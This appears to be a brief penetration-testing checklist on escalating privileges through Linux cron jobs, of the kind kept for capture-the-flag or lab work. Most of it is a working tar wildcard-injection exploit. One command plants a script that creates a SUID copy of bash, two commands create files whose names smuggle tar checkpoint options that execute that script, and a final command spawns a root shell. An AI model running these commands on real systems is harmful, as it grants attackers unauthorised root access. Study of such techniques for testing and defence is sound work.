# Abusing Cronjobs

### Checklist

- [ ] Can you reconise the cron job in linpeas output? YES, then its probably unlikely; NO, then you probably have a vector.
- [ ] Is the cron job writable? maybe add a custom cronjob
- [ ] Is the command in the cron job pointing to a writable file/directory? maybe exit the target file/dir
- [ ] Does the command contain a wildcard? `*`? follow these commands: [guide](https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c)
      - `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /<path called by cron job>/shell.sh`
      - `echo "" > "--checkpoint-action=exec=sh shell.sh"`
      - `echo "" > --checkpoint=1`
      - once the cron has run (every incriment of time)
      - `/bin/bash -p`
